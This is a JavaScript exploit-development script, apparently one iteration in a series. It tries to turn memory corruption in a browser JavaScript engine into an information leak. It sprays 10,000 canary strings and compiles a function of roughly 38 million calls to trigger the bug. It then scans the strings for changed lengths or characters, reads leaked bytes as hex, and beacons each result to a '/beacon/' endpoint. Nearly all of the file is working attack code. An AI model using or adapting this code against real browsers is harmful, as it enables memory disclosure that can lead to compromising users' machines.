// p371b - MetadataTable JSString corruption as info leak (FIXED)
//
// Fix from p371: BASE_LEN was 32 but actual string length was 30.
// ALL 10000 strings appeared "corrupted" because baseline was wrong.
// Fix: compute actual length dynamically, and use a CANARY approach:
// check if charCodeAt returns expected chars, not just length.
//
// Also: resolve ALL strings before compile (call .length + charCodeAt(0))
// so they're fully flattened and m_value points to StringImpl.
//
// Beacon prefix: V371B-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V371B-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V371B-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Phase 1: Create strings with KNOWN content
  var STR_COUNT = 10000;
  var strings = new Array(STR_COUNT);
  var strOK = 0;

  for (var i = 0; i < STR_COUNT; i++) {
    try {
      // Build a 32-char string with index-specific canary
      var idx = ('00000' + i).slice(-5);
      var s = 'X' + idx + 'X' + idx + 'YYYYYYYYYYYYYYYYYY';
      // s = "X00000X00000YYYYYYYYYYYYYYYYYY" = 1+5+1+5+18 = 30... hmm
      // Let me just build exactly 32:
      s = 'XX' + idx + 'XX' + idx + 'YYYYYYYYYYYYYYYY';
      // = 2+5+2+5+16 = 30... still 30
      // OK just pad to exact 32:
      s = idx + idx + idx + idx + idx + idx + '@@';
      // = 5*6 + 2 = 32
      strings[i] = s;
      strOK++;
    } catch(e) { break; }
  }

  // Verify and resolve ALL strings (forces m_value -> StringImpl)
  var actualLen = strings[0].length;
  B('STRINGS-' + strOK + '-len' + actualLen);

  var resolveOK = 0;
  for (var i = 0; i < STR_COUNT; i++) {
    if (!strings[i]) continue;
    try {
      var L = strings[i].length;
      var c0 = strings[i].charCodeAt(0);
      if (L === actualLen) resolveOK++;
    } catch(e) {}
  }
  B('RESOLVED-' + resolveOK);

  // Store canary: first char of each string for fast corruption check
  var canaries = new Uint8Array(STR_COUNT);
  for (var i = 0; i < STR_COUNT; i++) {
    try { canaries[i] = strings[i].charCodeAt(0); } catch(e) { canaries[i] = 0; }
  }

  // Phase 2: GC
  var gcP = [];
  for (var i = 0; i < 40; i++) gcP.push(new ArrayBuffer(65536));
  gcP = null;
  for (var i = 0; i < 20000; i++) var _gc = {a: i};

  setTimeout(function() {
    B('GC-DONE');

    // Phase 3: Compile 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p371bfn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p371bscan();';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    window.__p371bscan = function() {
      B('COMPILED-OK');

      // Phase 4: Scan for corruption using THREE checks:
      // A) .length changed (JSString length field or StringImpl::m_length)
      // B) charCodeAt(0) changed (data pointer or data content corrupted)
      // C) string throws on access (m_value points to unmapped memory)
      var lenHit = 0;
      var charHit = 0;
      var crashHit = 0;
      var leaks = [];

      for (var i = 0; i < STR_COUNT; i++) {
        if (!strings[i]) continue;
        try {
          var newLen = strings[i].length;
          var newC0 = strings[i].charCodeAt(0);

          var lenChanged = (newLen !== actualLen);
          var charChanged = (newC0 !== canaries[i]);

          if (!lenChanged && !charChanged) continue;

          // CORRUPTION DETECTED - send beacon IMMEDIATELY before any more reads
          if (lenChanged) {
            lenHit++;
            B('LENHIT-' + i + '-was' + actualLen + '-now' + newLen);
          }
          if (charChanged) {
            charHit++;
            B('CHARHIT-' + i + '-was' + canaries[i] + '-now' + newC0);
          }

          if (leaks.length >= 6) continue;

          // Try to read string content (might crash if m_value is bad pointer)
          var hex = '';
          var readOK = 0;
          try {
            var readN = Math.min(newLen > 0 ? newLen : 64, 64);
            for (var j = 0; j < readN; j++) {
              var cc = strings[i].charCodeAt(j);
              hex += hexByte(cc & 0xFF);
              if (cc > 255) hex += hexByte((cc >> 8) & 0xFF);
              readOK++;
            }
          } catch(e) {
            hex += '-READCRASH';
          }
          leaks.push({i: i, len: newLen, c0: newC0, data: hex, read: readOK});
          B('LEAK-' + leaks.length + '-idx' + i + '-len' + newLen + '-read' + readOK);
          B('LDATA-' + leaks.length + '-' + hex.substring(0, 200));

          // If length is very different, this might be an info leak
          // The new .length = whatever is at StringImpl::m_length in the corrupted target
          if (newLen !== actualLen && newLen > 0) {
            B('NEWLEN-' + leaks.length + '-' + newLen + '-hex' + newLen.toString(16));
          }

        } catch(e) {
          crashHit++;
          B('CRASH-' + i + '-' + String(e).substring(0, 40));
        }
      }

      B('RESULT-L' + lenHit + '-C' + charHit + '-X' + crashHit);

      if (lenHit === 0 && charHit === 0 && crashHit === 0) {
        B('NOCORRUPT');
        var alive = 0;
        for (var i = 0; i < Math.min(100, STR_COUNT); i++) {
          try {
            if (strings[i].length === actualLen) alive++;
          } catch(e) {}
        }
        B('ALIVE-' + alive);
      }

      B('DONE');
    };

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p371bfn) B('TIMEOUT-NO-COMPILE');
    }, 120000);
  }, 2000);
})();
